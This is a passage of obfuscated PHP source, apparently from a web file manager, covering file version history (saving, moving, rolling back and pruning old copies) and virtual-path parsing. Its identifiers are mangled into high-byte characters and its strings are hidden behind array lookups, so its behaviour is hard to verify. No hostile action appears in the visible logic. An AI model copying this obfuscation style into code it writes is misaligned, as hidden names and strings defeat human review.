(!$ô±ï÷¨‰) { return; } self::add($ô±ï÷¨‰); } public static function eventBeforeEdit($‡¨πµˆ’) { $·à⁄ÄÜ‰ = self::parsePath($‡¨πµˆ’[0]); if (!$·à⁄ÄÜ‰) { return; } self::add($·à⁄ÄÜ‰); } public static function eventBeforeCopyFile($Ïå Ûﬁ≈, $Øã…⁄Å∞, $Ï÷úª±å, $Ñ†ªóõò, $¿¯ñßÒ©, $„≥Ú¯éÓ) { $÷Ã’â˝Ò = $Ï÷úª±å->getPathOuter($Ñ†ªóõò); $µ∆ΩÛ»œ = self::parsePath($÷Ã’â˝Ò); if (!$µ∆ΩÛ»œ) { return; } self::add($µ∆ΩÛ»œ); } public static function eventBeforeRename($˙Ùü∏¬≥) { $ÒΩë‘∑˘ =& $_SERVER[Çâä∆◊¡]; $Æµ∏“≠ì = self::parsePath($˙Ùü∏¬≥[0]); if (!$Æµ∏“≠ì) { return; } $ÂÕΩ¬ªõ = self::checkInHistory($Æµ∏“≠ì); if (!$ÂÕΩ¬ªõ) { return; } if ($ÂÕΩ¬ªõ[$ÒΩë‘∑˘[33]] == $ÒΩë‘∑˘[192]) { $—Œ‘®òÆ = self::listData($Æµ∏“≠ì); if ($—Œ‘®òÆ && $—Œ‘®òÆ[$ÒΩë‘∑˘[364]]) { self::moveHistory($Æµ∏“≠ì, $˙Ùü∏¬≥[1]); } } else { IO::rename($ÂÕΩ¬ªõ[$ÒΩë‘∑˘[78]], $˙Ùü∏¬≥[1]); } } public static function eventBeforeMove($ùπí€»§) { $ß¯ ˛Óß =& $_SERVER[Çâä∆◊¡]; $‘ßú…Œﬂ = self::parsePath($ùπí€»§[0]); if (!$‘ßú…Œﬂ) { return; } $∆¢·Û¡è = self::parsePath($ùπí€»§[1]); if (!$∆¢·Û¡è) { return; } $ó˘úµê∆ = $ùπí€»§[3]; $Éõ˙π‹Œ = self::checkInHistory($‘ßú…Œﬂ); if (!$Éõ˙π‹Œ) { return; } $⁄∏…ÿ ó = self::pathHistory($∆¢·Û¡è); if ($Éõ˙π‹Œ[$ß¯ ˛Óß[33]] == $ß¯ ˛Óß[192]) { $Èøßµæœ = self::listData($‘ßú…Œﬂ); $±⁄ª“Ω› = rtrim($∆¢·Û¡è, $ß¯ ˛Óß[8]) . $ß¯ ˛Óß[8] . ($ó˘úµê∆ ? $ó˘úµê∆ : get_path_this($‘ßú…Œﬂ)); $Ñî»∞‰â = self::listData($±⁄ª“Ω›); if ($Èøßµæœ && $Èøßµæœ[$ß¯ ˛Óß[364]] && $Ñî»∞‰â && $Ñî»∞‰â[$ß¯ ˛Óß[364]]) { return self::clear($‘ßú…Œﬂ); } if ($Èøßµæœ && $Èøßµæœ[$ß¯ ˛Óß[364]]) { self::moveHistory($‘ßú…Œﬂ, $ó˘úµê∆, $⁄∏…ÿ ó); } } else { IO::move($Éõ˙π‹Œ[$ß¯ ˛Óß[78]], $⁄∏…ÿ ó, !1, $ó˘úµê∆); self::clearEmptyFolder(IO::pathFather($Éõ˙π‹Œ[$ß¯ ˛Óß[78]])); } } public static function eventAfterRemove($‘Ó‚û”π, $˙«ÔÖ”Ê) { $Êª¢»Õ™ =& $_SERVER[Çâä∆◊¡]; if (!$˙«ÔÖ”Ê) { return; } $Ü¨â–Áô = self::parsePath($‘Ó‚û”π[0]); if (!$Ü¨â–Áô) { return; } $¬ª€óâë = self::checkInHistory($Ü¨â–Áô); if (!$¬ª€óâë) { return; } if ($¬ª€óâë[$Êª¢»Õ™[33]] == $Êª¢»Õ™[192]) { $çï‡§Ω‚ = self::listData($Ü¨â–Áô, !1); if ($çï‡§Ω‚ && $çï‡§Ω‚[$Êª¢»Õ™[364]]) { self::clear($Ü¨â–Áô, !1); } } else { IO::remove($¬ª€óâë[$Êª¢»Õ™[78]]); self::clearEmptyFolder(IO::pathFather($¬ª€óâë[$Êª¢»Õ™[78]])); } } private static function checkInHistory($óåõÔú) { $íπﬁ≈ñ› = self::pathHistory($óåõÔú); if (!IO::exist($íπﬁ≈ñ›)) { $íπﬁ≈ñ› .= $_SERVER[Çâä∆◊¡][1208]; } return IO::exist($íπﬁ≈ñ›) ? IO::info($íπﬁ≈ñ›) : !1; } private static function parsePath($˜ó“Ì∫â) { $Î©ÎÅí÷ =& $_SERVER[Çâä∆◊¡]; if (!$˜ó“Ì∫â) { return !1; } if ($GLOBALS[$Î©ÎÅí÷[1209]]) { return; } $ﬂÓÜÙÛ™ = KodIO::parse($˜ó“Ì∫â); $˝…‡∏–Û = $ﬂÓÜÙÛ™[$Î©ÎÅí÷[33]]; $˘ùÙ˚Ï = !$˝…‡∏–Û || $˝…‡∏–Û == KodIO::KOD_IO || $˝…‡∏–Û == KodIO::KOD_SHARE_ITEM; if (!$˘ùÙ˚Ï || !$ﬂÓÜÙÛ™[$Î©ÎÅí÷[1210]]) { return !1; } if (substr($˜ó“Ì∫â, 0, strlen(DATA_PATH . $Î©ÎÅí÷[1211])) == DATA_PATH . $Î©ÎÅí÷[1211]) { return !1; } if ($˝…‡∏–Û == KodIO::KOD_SHARE_ITEM) { $ºú®‚â´ = IO::init($˜ó“Ì∫â); if ($ºú®‚â´->pathParse[$Î©ÎÅí÷[1138]]) { return self::parsePath($ºú®‚â´->pathParse[$Î©ÎÅí÷[1138]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ê’ÓáıÇ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Î©ÎÅí÷[1212]); foreach ($ê’ÓáıÇ as $∏–ı—ê‰) { if (!$˝…‡∏–Û && substr($˜ó“Ì∫â, 0, strlen($∏–ı—ê‰)) == $∏–ı—ê‰) { return !1; } } self::log($GLOBALS[$Î©ÎÅí÷[1133]] . $Î©ÎÅí÷[1213] . $˜ó“Ì∫â); return $˜ó“Ì∫â; } private static function pathHistory($¥‡å‘î∏) { $˘ÈìØèµ =& $_SERVER[Çâä∆◊¡]; $ô€≤Îû‹ = self::$_historyBase . ltrim(KodIO::clear($¥‡å‘î∏), $˘ÈìØèµ[8]); $ô€≤Îû‹ = str_replace(array($˘ÈìØèµ[1214]), array($˘ÈìØèµ[1215]), $ô€≤Îû‹); return $ô€≤Îû‹; } public static function log($π˙ûóœ») { } public static function historyCount($˙˝öÜï∫) { $ ∞•˚ÂÖ =& $_SERVER[Çâä∆◊¡]; $¸¡‹á‰Ü = array(); $¥ÕÚìÑï = array(); foreach ($˙˝öÜï∫ as $¶Æ∆¡∞ì) { $°§ô˚ı√ = get_path_father($¶Æ∆¡∞ì); if (!$¥ÕÚìÑï[$°§ô˚ı√]) { $¥ÕÚìÑï[$°§ô˚ı√] = array(); } $¥ÕÚìÑï[$°§ô˚ı√][] = get_path_this($¶Æ∆¡∞ì); } foreach ($¥ÕÚìÑï as $°§ô˚ı√ => $∆èÊê⁄ø) { $ﬂ¨òµñì = self::parsePath($°§ô˚ı√); if (!$ﬂ¨òµñì) { continue; } foreach ($∆èÊê⁄ø as $¡ÇÈ§ü‡) { $††¶ƒ–® = self::listData(rtrim($ﬂ¨òµñì, $ ∞•˚ÂÖ[8]) . $ ∞•˚ÂÖ[8] . $¡ÇÈ§ü‡, !1); if ($††¶ƒ–® && $††¶ƒ–®[$ ∞•˚ÂÖ[364]]) { $¸¡‹á‰Ü[rtrim($°§ô˚ı√, $ ∞•˚ÂÖ[8]) . $ ∞•˚ÂÖ[8] . $¡ÇÈ§ü‡] = count($††¶ƒ–®[$ ∞•˚ÂÖ[364]]); } } } return $¸¡‹á‰Ü; } public static function add($€à£Ÿî°) { $“¶£˚åŸ =& $_SERVER[Çâä∆◊¡]; $€ø˚∑§˘ = self::listData($€à£Ÿî°); if (!$€ø˚∑§˘) { return; } $Ñ´äØ¿ê = Model($“¶£˚åŸ[763])->get($“¶£˚åŸ[1216]); $ŸΩ„Ñ◊∆ = $GLOBALS[$“¶£˚åŸ[6]][$“¶£˚åŸ[90]][$“¶£˚åŸ[1194]]; $º˘ºˆ”À = $Ñ´äØ¿ê == $“¶£˚åŸ[1217] ? 5 : $ŸΩ„Ñ◊∆; if ($ŸΩ„Ñ◊∆ <= 0) { return; } $–åﬂú≠ﬁ = IO::hashSimple($€à£Ÿî°); $éﬁ†å∆µ = IO::info($€à£Ÿî°); $ﬂ‡ã˝îÀ = $€ø˚∑§˘[$“¶£˚åŸ[364]]; if ($éﬁ†å∆µ[$“¶£˚åŸ[80]] == 0) { return; } if ($éﬁ†å∆µ[$“¶£˚åŸ[80]] >= 1024 * 1024 * 500) { return !1; } if ($ﬂ‡ã˝îÀ && $ﬂ‡ã˝îÀ[0][$“¶£˚åŸ[170]] == $–åﬂú≠ﬁ) { return !0; } if (array_key_exists($“¶£˚åŸ[195], $éﬁ†å∆µ) && !$éﬁ†å∆µ[$“¶£˚åŸ[195]]) { return !1; } $õ√ã‡ü† = short_id(time()); $·õ∫»œ¸ = array($“¶£˚åŸ[401] => $õ√ã‡ü†, $“¶£˚åŸ[170] => $–åﬂú≠ﬁ, $“¶£˚åŸ[32] => $éﬁ†å∆µ[$“¶£˚åŸ[32]] . $“¶£˚åŸ[10] . date($“¶£˚åŸ[1218]) . rand_string(1), $“¶£˚åŸ[80] => $éﬁ†å∆µ[$“¶£˚åŸ[80]], $“¶£˚åŸ[452] => USER_ID, $“¶£˚åŸ[193] => time(), $“¶£˚åŸ[1219] => $“¶£˚åŸ[12]); IO::mkdir($€ø˚∑§˘[$“¶£˚åŸ[1220]]); $ªºßÓ‚¨ = IO::copy($€à£Ÿî°, $€ø˚∑§˘[$“¶£˚åŸ[1220]], !1, $·õ∫»œ¸[$“¶£˚åŸ[32]]); if (!$ªºßÓ‚¨) { self::clearEmptyFolder($€ø˚∑§˘[$“¶£˚åŸ[1220]]); return !1; } array_unshift($ﬂ‡ã˝îÀ, $·õ∫»œ¸); if (count($ﬂ‡ã˝îÀ) > $º˘ºˆ”À) { $Æ’≈ÈÏ” = array_slice($ﬂ‡ã˝îÀ, $º˘ºˆ”À); foreach ($Æ’≈ÈÏ” as $—µá—Ùû) { IO::remove($€ø˚∑§˘[$“¶£˚åŸ[1220]] . $—µá—Ùû[$“¶£˚åŸ[32]]); } $ﬂ‡ã˝îÀ = array_slice($ﬂ‡ã˝îÀ, 0, $º˘ºˆ”À); } return self::saveData($€ø˚∑§˘[$“¶£˚åŸ[1221]], $ﬂ‡ã˝îÀ); } public static function remove($úéôê˜Ö, $¨äƒﬂò”) { $≥˘˜Àµ¢ =& $_SERVER[Çâä∆◊¡]; $≥Ï‚·ı´ = self::listData($úéôê˜Ö); $ÕîÉ†ﬁë = array(); if (!$≥Ï‚·ı´) { return !1; } foreach ($≥Ï‚·ı´[$≥˘˜Àµ¢[364]] as $˙Íù“—¿) { if ($˙Íù“—¿[$≥˘˜Àµ¢[401]] == $¨äƒﬂò”) { IO::remove($≥Ï‚·ı´[$≥˘˜Àµ¢[1220]] . $˙Íù“—¿[$≥˘˜Àµ¢[32]]); continue; } $ÕîÉ†ﬁë[] = $˙Íù“—¿; } return self::saveData($≥Ï‚·ı´[$≥˘˜Àµ¢[1221]], $ÕîÉ†ﬁë); } public static function clear($∞–ñƒÄÃ, $úÉ√ÛåÙ = true) { $Á∫≥ÙÓ® =& $_SERVER[Çâä∆◊¡]; $Ç•áÿÚ” = self::listData($∞–ñƒÄÃ, $úÉ√ÛåÙ); if (!$Ç•áÿÚ”) { return !1; } foreach ($Ç•áÿÚ”[$Á∫≥ÙÓ®[364]] as $œÚï˙Â«) { IO::remove($Ç•áÿÚ”[$Á∫≥ÙÓ®[1220]] . $œÚï˙Â«[$Á∫≥ÙÓ®[32]]); } return self::saveData($Ç•áÿÚ”[$Á∫≥ÙÓ®[1221]], array()); } public static function moveHistory($ä§Ã´ìÃ, $ê¿àî∞ß = '', $è™ıöÁ≥ = '') { $÷û◊ÈïÔ =& $_SERVER[Çâä∆◊¡]; $úæªÂ«Û = self::listData($ä§Ã´ìÃ, !1); if (!$úæªÂ«Û || !$úæªÂ«Û[$÷û◊ÈïÔ[364]]) { return !1; } $ã´ÒΩ¡è = $÷û◊ÈïÔ[1208]; $ê¿àî∞ß = $ê¿àî∞ß ? $ê¿àî∞ß : get_path_this($ä§Ã´ìÃ); $è™ıöÁ≥ = $è™ıöÁ≥ ? $è™ıöÁ≥ : $úæªÂ«Û[$÷û◊ÈïÔ[1220]]; $˛Çº¶¸Ò = substr(get_path_this($úæªÂ«Û[$÷û◊ÈïÔ[1221]]), 0, -strlen($ã´ÒΩ¡è)); foreach ($úæªÂ«Û[$÷û◊ÈïÔ[364]] as $É©¨î€Ï => $‘∑•î˚Õ) { $Ö˜Œ«ÀØ = $ê¿àî∞ß . substr($‘∑•î˚Õ[$÷û◊ÈïÔ[32]], strlen($˛Çº¶¸Ò)); $Ó“¥Ú‚¶ = IO::move($úæªÂ«Û[$÷û◊ÈïÔ[1220]] . $‘∑•î˚Õ[$÷û◊ÈïÔ[32]], $è™ıöÁ≥, !1, $Ö˜Œ«ÀØ); if ($Ó“¥Ú‚¶) { $úæªÂ«Û[$÷û◊ÈïÔ[364]][$É©¨î€Ï][$÷û◊ÈïÔ[32]] = $Ö˜Œ«ÀØ; } } $úæªÂ«Û[$÷û◊ÈïÔ[1221]] = IO::move($úæªÂ«Û[$÷û◊ÈïÔ[1221]], $è™ıöÁ≥, !1, $ê¿àî∞ß . $ã´ÒΩ¡è); self::saveData($úæªÂ«Û[$÷û◊ÈïÔ[1221]], $úæªÂ«Û[$÷û◊ÈïÔ[364]]); self::clearEmptyFolder($úæªÂ«Û[$÷û◊ÈïÔ[1220]]); } public static function rollback($Ñ—Çù∞¯, $ìà™Êü) { $¸≠Ñ«Íï =& $_SERVER[Çâä∆◊¡]; $á∫Ì∆‚ù = self::listData($Ñ—Çù∞¯); if (!$á∫Ì∆‚ù) { return; } $ˆÀˆ∑· = IO::info($Ñ—Çù∞¯); foreach ($á∫Ì∆‚ù[$¸≠Ñ«Íï[364]] as $£ÿ§˘Õ => $∑˙®ü∑õ) { if ($∑˙®ü∑õ[$¸≠Ñ«Íï[401]] == $ìà™Êü) { self::add($Ñ—Çù∞¯); $¯ÀÇœÆÙ = $á∫Ì∆‚ù[$¸≠Ñ«Íï[1220]] . $∑˙®ü∑õ[$¸≠Ñ«Íï[32]]; $–£ÛŒºË = IO::copy($¯ÀÇœÆÙ, IO::pathFather($Ñ—Çù∞¯), REPEAT_REPLACE, $ˆÀˆ∑·[$¸≠Ñ«Íï[32]]); if ($–£ÛŒºË) { self::remove($Ñ—Çù∞¯, $ìà™Êü); } return $–£ÛŒºË; } } return !1; } public static function setDetail($ßÍ–ˆ∆Œ, $—®Ô‚µÁ, $™ﬂ≥˙ﬂä) { $¯é¢Ø∏Û =& $_SERVER[Çâä∆◊¡]; $Ä°ﬂ‡‡¶ = self::listData($ßÍ–ˆ∆Œ); if (!$Ä°ﬂ‡‡¶) { return; } foreach ($Ä°ﬂ‡‡¶[$¯é¢Ø∏Û[364]] as $®ÿ◊øéﬁ => $∏ç·ÙûÉ) { if ($∏ç·ÙûÉ[$¯é¢Ø∏Û[401]] == $—®Ô‚µÁ) { $Ä°ﬂ‡‡¶[$¯é¢Ø∏Û[364]][$®ÿ◊øéﬁ][$¯é¢Ø∏Û[1219]] = $™ﬂ≥˙ﬂä; self::saveData($Ä°ﬂ‡‡¶[$¯é¢Ø∏Û[1221]], $Ä°ﬂ‡‡¶[$¯é¢Ø∏Û[364]]); return !0; } } return !1; } public static function fileInfo($ô¿Õ–¸ , $›üûı—Ú) { $´«·ÑÄá =& $_SERVER[Çâä∆◊¡]; $≠¬”ˆ‘¶ = self::listData($ô¿Õ–¸ ); if (!$≠¬”ˆ‘¶) { show_json(LNG($´«·ÑÄá[106]), !1); } $∫¸óÂ…‘ = $´«·ÑÄá[12]; foreach ($≠¬”ˆ‘¶[$´«·ÑÄá[364]] as $ﬁâû±≠ñ => $çóèÔá˘) { if ($çóèÔá˘[$´«·ÑÄá[401]] != $›üûı—Ú) { continue; } $∫¸óÂ…‘ = $≠¬”ˆ‘¶[$´«·ÑÄá[1220]] . $çóèÔá˘[$´«·ÑÄá[32]]; break; } if (!$∫¸óÂ…‘) { show_json(LNG($´«·ÑÄá[106]), !1); } return IO::info($∫¸óÂ…‘); } public static function fileOut($Ü¸ó√≠ƒ, $ü≈©˘¡˚, $˘‘Íª∑¡ = false) { $π©¬Ñ§ë =& $_SERVER[Çâä∆◊¡]; $Ç˛˘áÚ£ = self::fileInfo($Ü¸ó√≠ƒ, $ü≈©˘¡˚); $˝˜¡‰§¬ =& $GLOBALS[$π©¬Ñ§ë[7]]; $˘‘Íª∑¡ = isset($˝˜¡‰§¬[$π©¬Ñ§ë[1184]]) && $˝˜¡‰§¬[$π©¬Ñ§ë[1184]] == 1; if (isset($˝˜¡‰§¬[$π©¬Ñ§ë[33]]) && $˝˜¡‰§¬[$π©¬Ñ§ë[33]] == $π©¬Ñ§ë[1222]) { return IO::fileOutImage($Ç˛˘áÚ£[$π©¬Ñ§ë[78]], $˝˜¡‰§¬[$π©¬Ñ§ë[1223]]); } IO::fileOut($Ç˛˘áÚ£[$π©¬Ñ§ë[78]], $˘‘Íª∑¡, get_path_this($Ü¸ó√≠ƒ)); } public static function listData($¯ÉççîÌ, $ª’√ﬁÅÉ = true) { $⁄±¸ô¢ª =& $_SERVER[Çâä∆◊¡]; if ($ª’√ﬁÅÉ && !IO::exist($¯ÉççîÌ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¯ÉççîÌ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ãá‰õÉ± = self::pathHistory($¯ÉççîÌ); $ËÔÂÁˆº = array($⁄±¸ô¢ª[1221] => $Ãá‰õÉ± . $⁄±¸ô¢ª[1208], $⁄±¸ô¢ª[1220] => rtrim(get_path_father($Ãá‰õÉ±), $⁄±¸ô¢ª[8]) . $⁄±¸ô¢ª[8], $⁄±¸ô¢ª[364] => array()); $›Áá‡±¡ = IO::getContent($ËÔÂÁˆº[$⁄±¸ô¢ª[1221]]); if ($›Áá‡±¡) { $∑îÉ∞ôπ = json_decode($›Áá‡±¡, !0); if (is_array($∑îÉ∞ôπ)) { $ËÔÂÁˆº[$⁄±¸ô¢ª[364]] = $∑îÉ∞ôπ; } } return $ËÔÂÁˆº; } private static function saveData($êìû·˘˝, $†»˝Ï‚∫) { $¸…„›àó =& $_SERVER[Çâä∆◊¡]; self::log($¸…„›àó[1224] . $êìû·˘˝ . $¸…„›àó[71] . count($†»˝Ï‚∫), $¸…„›àó[745]); if ($†»˝Ï‚∫) { return IO::setContent($êìû·˘˝, json_encode($†»˝Ï‚∫)); } $ôÔ¬Êµó = IO::pathFather($êìû·˘˝); IO::remove($êìû·˘˝); self::clearEmptyFolder($ôÔ¬Êµó); return !0; } public static function clearEmptyFolder($¶êïÅ–È) { $∫é∫˝ı¡ =& $_SERVER[Çâä∆◊¡]; if (trim($¶êïÅ–È, $∫é∫˝ı¡[8]) == trim(self::$_historyBase, $∫é∫˝ı¡[8])) { return; } $û‹€”Ïù = IO::pathFather($¶êïÅ–È); $•ìœÀ°— = IO::has($¶êïÅ–È, !0); if ($•ìœÀ°—[$∫é∫˝ı¡[202]] > 0 || $•ìœÀ°—[$∫é∫˝ı¡[203]] > 0) { return; } IO::remove($¶êïÅ–È); self::clearEmptyFolder($û‹€”Ïù); } private static function getBasePath() { $ç‰àÅÛ =& $_SERVER[Çâä∆◊¡]; $ƒ¢»Êû¿ = Model($ç‰àÅÛ[1225])->get($ç‰àÅÛ[1226]); if ($ƒ¢»Êû¿) { if (!IO::exist($ƒ¢»Êû¿)) { IO::mkdir($ƒ¢»Êû¿); } if (get_path_this($ƒ¢»Êû¿) == $ç‰àÅÛ[1211]) { $ù¿öﬁÒÆ = $ç‰àÅÛ[1227] . rand_string(8); @rename($ƒ¢»Êû¿, get_path_father($ƒ¢»Êû¿) . $ç‰àÅÛ[8] . $ù¿öﬁÒÆ); $ƒ¢»Êû¿ = DATA_PATH . $ù¿öﬁÒÆ . $ç‰àÅÛ[8]; file_put_contents(DATA_PATH . $ç‰àÅÛ[1228], $ç‰àÅÛ[12]); Model($ç‰àÅÛ[1225])->set($ç‰àÅÛ[1226], $ƒ¢»Êû¿); } return $ƒ¢»Êû¿; } $ƒ¢»Êû¿ = DATA_PATH . $ç‰àÅÛ[1227] . rand_string(8) . $ç‰àÅÛ[8]; $ƒ¢»Êû¿ = IO::mkdir($ƒ¢»Êû¿); $ƒ¢»Êû¿ = rtrim($ƒ¢»Êû¿, $ç‰àÅÛ[8]) . $ç‰àÅÛ[8]; file_put_contents($ƒ¢»Êû¿ . $ç‰àÅÛ[1228], $ç‰àÅÛ[12]); file_put_contents(DATA_PATH . $ç‰àÅÛ[1228], $ç‰àÅÛ[12]); Model($ç‰àÅÛ[1225])->set($ç‰àÅÛ[1226], $ƒ¢»Êû¿); return $ƒ¢»Êû¿; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\165\162\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\x65\162\x52\145\143\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\173\165\163\145\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\106\x69\154\x65\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\162\x46\x69\154\x65\x54\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\x70\x52\157\157\x74\x53\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\x68\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\x72\x53\x68\x61\162\x65\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\145\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\x65\111\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\x72\x65\x49\164\x65\155\x4c\151\156\153\175"; const KOD_SEARCH = "\x7b\x73\x65\141\x72\143\x68\x7d"; const KOD_BLOCK = "\173\x62\x6c\157\143\x6b\x7d"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\122\145\x6e\143\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\x76\x65\x72\x7d"; public static function typeList() { $⁄ôœü±á =& $_SERVER[Çâä∆◊¡]; return array($⁄ôœü±á[1229] => self::KOD_SOURCE, $⁄ôœü±á[1230] => self::KOD_USER_RECYCLE, $⁄ôœü±á[1231] => self::KOD_USER_FAV, $⁄ôœü±á[1232] => self::KOD_USER_FILE_TAG, $⁄ôœü±á[1233] => self::KOD_USER_FILE_TYPE, $⁄ôœü±á[1234] => self::KOD_GROUP_ROOT_SELF, $⁄ôœü±á[1235] => self::KOD_USER_SHARE, $⁄ôœü±á[1236] => self::KOD_USER_SHARE_LINK, $⁄ôœü±á[1237] => self::KOD_USER_SHARE_TO_ME, $⁄ôœü±á[1238] => self::KOD_SHARE_ITEM, $⁄ôœü±á[1239] => self::KOD_SHARE_LINK, $⁄ôœü±á[1240] => self::KOD_SEARCH, $⁄ôœü±á[1241] => self::KOD_BLOCK, $⁄ôœü±á[1242] => self::KOD_IO, $⁄ôœü±á[1243] => self::KOD_USER_RECENT, $⁄ôœü±á[1244] => self::KOD_USER_DRIVER); } public static function parse($˛é˝©¥≈) { $ÇºËñ¡ =& $_SERVER[Çâä∆◊¡]; $˛é˝©¥≈ = self::clear($˛é˝©¥≈); $‘›«â≤˚ = array_values(self::typeList()); preg_match($ÇºËñ¡[1245], $˛é˝©¥≈, $∏Ú∂‰„ì); $Ô˙Êîôú = array($ÇºËñ¡[423] => !1, $ÇºËñ¡[1246] => !1, $ÇºËñ¡[420] => !1, $ÇºËñ¡[78] => $˛é˝©¥≈, $ÇºËñ¡[1155] => !1, $ÇºËñ¡[1154] => $ÇºËñ¡[12]); if (is_array($∏Ú∂‰„ì) && count($∏Ú∂‰„ì) == 5) { $ò’Ä÷Ê´ = $ÇºËñ¡[1247] . $∏Ú∂‰„ì[2] . $ÇºËñ¡[322]; if (in_array($ò’Ä÷Ê´, $‘›«â≤˚)) { $Ô˙Êîôú[$ÇºËñ¡[1155]] = $∏Ú∂‰„ì[1]; $Ô˙Êîôú[$ÇºËñ¡[33]] = $ò’Ä÷Ê´; $Ô˙Êîôú[$ÇºËñ¡[1248]] = substr($ò’Ä÷Ê´, 1, -1); $Ô˙Êîôú[$ÇºËñ¡[401]] = $∏Ú∂‰„ì[3]; } $Ô˙Êîôú[$ÇºËñ¡[1154]] = $∏Ú∂‰„ì[4]; } $≤ƒã†ƒÛ = array($ÇºËñ¡[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ô˙Êîôú[$ÇºËñ¡[1210]] = in_array($Ô˙Êîôú[$ÇºËñ¡[33]], $≤ƒã†ƒÛ); return $Ô˙Êîôú; } public static function isTruePath($°˘›ÓÏé) { $ë°Ò⁄Ç› =& $_SERVER[Çâä∆◊¡]; if (substr($°˘›ÓÏé, 0, 1) != $ë°Ò⁄Ç›[1247]) { return !0; } if (strpos($°˘›ÓÏé, $ë°Ò⁄Ç›[409]) === 0) { return !0; } if (strpos($°˘›ÓÏé, $ë°Ò⁄Ç›[1214]) === 0) { return !0; } if (strpos($°˘›ÓÏé, $ë°Ò⁄Ç›[1249]) === 0) { return !0; } if (strpos($°˘›ÓÏé, $ë°Ò⁄Ç›[1250]) === 0) { return !0; } if (strpos($°˘›ÓÏé, $ë°Ò⁄Ç›[1251]) === 0) { return !0; } return !1; } public static function clear($¯∑ƒ˛¡Ó) { $˛∂∂⁄ÈÓ =& $_SERVER[Çâä∆◊¡]; $¯∑ƒ˛¡Ó = str_replace(array($˛∂∂⁄ÈÓ[1065], $˛∂∂⁄ÈÓ[226]), $˛∂∂⁄ÈÓ[53], $¯∑ƒ˛¡Ó); $¯∑ƒ˛¡Ó = str_replace($˛∂∂⁄ÈÓ[98], $˛∂∂⁄ÈÓ[8], $¯∑ƒ˛¡Ó); $ÊËÅ ¢Å = $˛∂∂⁄ÈÓ[1252]; if (substr($¯∑ƒ˛¡Ó, 0, 3) == $˛∂∂⁄ÈÓ[1253]) { $¯∑ƒ˛¡Ó = substr($¯∑ƒ˛¡Ó, 3); } while (strstr($¯∑ƒ˛¡Ó, $ÊËÅ ¢Å)) { $¯∑ƒ˛¡Ó = str_replace($ÊËÅ ¢Å, $˛∂∂⁄ÈÓ[8], $¯∑ƒ˛¡Ó); } $¯∑ƒ˛¡Ó = preg_replace($˛∂∂⁄ÈÓ[1254], $˛∂∂⁄ÈÓ[8], $¯∑ƒ˛¡Ó); if ($¯∑ƒ˛¡Ó == $˛∂∂⁄ÈÓ[8]) { return $˛∂∂⁄ÈÓ[8]; } $¯∑ƒ˛¡Ó = rtrim($¯∑ƒ˛¡Ó, $˛∂∂⁄ÈÓ[8]); return $¯∑ƒ˛¡Ó; } public static function sourceID($ê‹©ñÁ•) { $ç÷’‡⁄Ú =& $_SERVER[Çâä∆◊¡]; $Ëõ»ßÔÑ = self::parse($ê‹©ñÁ•); if ($Ëõ»ßÔÑ[$ç÷’‡⁄Ú[33]] !== self::KOD_SOURCE) { show_json(LNG($ç÷’‡⁄Ú[1255]), !1); } return $Ëõ»ßÔÑ[$ç÷’‡⁄Ú[401]]; } public static function make($÷ΩçÄßö) { if (!$÷ΩçÄßö) { return !1; } return self::makePath(self::KOD_SOURCE, intval($÷ΩçÄßö)); } public static function makeShare($ê√êÔÜº, $ó’˙àüŸ) { return self::makePath(self::KOD_SHARE_ITEM, $ê√êÔÜº, $ó’˙àüŸ); } public static function makeFileTypePath($Ò—ó§÷Ä) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ò—ó§÷Ä); } public static function makeFileTagPath($Ó√ù¸ Ñ) { return self::makePath(self::KOD_USER_FILE_TAG, $Ó√ù¸ Ñ); } public static function makePath($ıöÈÚº·, $Ú õ≠ê˝ = '', $œ¥˝¯° = '') { $Íõƒ‘äÁ =& $_SERVER[Çâä∆◊¡]; $åØãäò⁄ = substr($ıöÈÚº·, 1, -1); $ì˜Ááóæ = $Íõƒ‘äÁ[1256] . $åØãäò⁄ . $Íõƒ‘äÁ[1257] . $Ú õ≠ê˝ . $Íõƒ‘äÁ[1258]; $ì˜Ááóæ = $œ¥˝¯° ? $ì˜Ááóæ . $œ¥˝¯° . $Íõƒ‘äÁ[8] : $ì˜Ááóæ; return $ì˜Ááóæ; } public static function hashPath($Ñô˘àî©, $ú∏ıàã¬ = true) { $†ÈÍ¸‹ß =& $_SERVER[Çâä∆◊¡]; $õ⁄º‘ø  = is_array($Ñô˘àî©) ? $Ñô˘àî© : IO::info($Ñô˘àî©); $ãõó›À» = _get($õ⁄º‘ø , $†ÈÍ¸‹ß[1259], $†ÈÍ¸‹ß[12]); if (!$ãõó›À» && isset($õ⁄º‘ø [$†ÈÍ¸‹ß[403]])) { $õ⁄º‘ø  = IO::info(KodIO::make($õ⁄º‘ø [$†ÈÍ¸‹ß[403]])); $ãõó›À» = _get($õ⁄º‘ø , $†ÈÍ¸‹ß[1259], $†ÈÍ¸‹ß[12]); } if (!$ãõó›À» && $ú∏ıàã¬) { $∏∞Ö©îñ = KodIO::parse($õ⁄º‘ø [$†ÈÍ¸‹ß[78]]); if (!$∏∞Ö©îñ[$†ÈÍ¸‹ß[33]]) { $ãõó›À» = IO::hashSimple($õ⁄º‘ø [$†ÈÍ¸‹ß[78]]); } } if (!$ãõó›À») { $ãõó›À» = 